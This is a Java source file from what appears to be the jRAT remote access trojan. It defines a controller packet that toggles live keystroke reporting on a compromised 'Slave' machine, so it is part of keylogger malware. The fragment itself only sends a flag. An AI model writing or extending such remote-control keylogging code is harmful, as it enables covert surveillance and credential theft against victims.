package jrat.module.keys.packets;

import jrat.controller.Slave;
import jrat.controller.packets.outgoing.OutgoingPacket;

/**
 * Toggles live key reporting for this client
 */
public class PacketToggleLive implements OutgoingPacket {

    private boolean enabled;

    public PacketToggleLive(boolean enabled) {
        this.enabled = enabled;
    }

    public void write(Slave client) throws Exception {
        client.writeBoolean(this.enabled);
    }

    public short getPacketId() {
        return 125;
    }
}
